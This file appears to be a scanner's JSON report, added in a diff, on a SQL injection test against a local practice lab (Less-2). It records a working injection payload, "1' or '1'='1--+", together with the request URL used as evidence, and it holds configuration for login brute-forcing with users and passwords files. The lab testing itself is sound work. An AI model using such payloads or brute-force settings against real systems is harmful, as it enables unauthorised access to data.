@@ -1,0 +1,46 @@
+{
+  "meta": {
+    "generated_at": "2025-10-28T09:52:28Z",
+    "target": "http://localhost:8900/Less-2/",
+    "modules": [
+      "sql"
+    ],
+    "param": "id",
+    "cookie": false,
+    "enable_time": true,
+    "time_threshold": 3.0,
+    "login_path": "",
+    "user_field": "username",
+    "pass_field": "password",
+    "max_attempts": 200,
+    "delay": 0.0,
+    "users_file": "users.txt",
+    "passwords_file": "passwords.txt",
+    "success_indicator": null
+  },
+  "results": {
+    "sql": {
+      "name": "sql_injection",
+      "target": "http://localhost:8900/Less-2/",
+      "detected": true,
+      "vulnerable_payload": "1' or '1'='1--+",
+      "payload_category": "error_based",
+      "payload_type": "single_quote",
+      "evidence": [
+        {
+          "payload": "1' or '1'='1--+",
+          "method": "GET",
+          "url": "http://localhost:8900/Less-2/?id=1'%20or%20'1'='1--+",
+          "status_code": 200,
+          "length": 841,
+          "diff_ratio": 0.8389,
+          "time": 0.005,
+          "reason": "syntax_error_diff",
+          "matched_signature": "syntax_error"
+        }
+      ],
+      "attempts_tried": 3,
+      "notes": "Enhanced: supports optional time-based detection."
+    }
+  }
+}
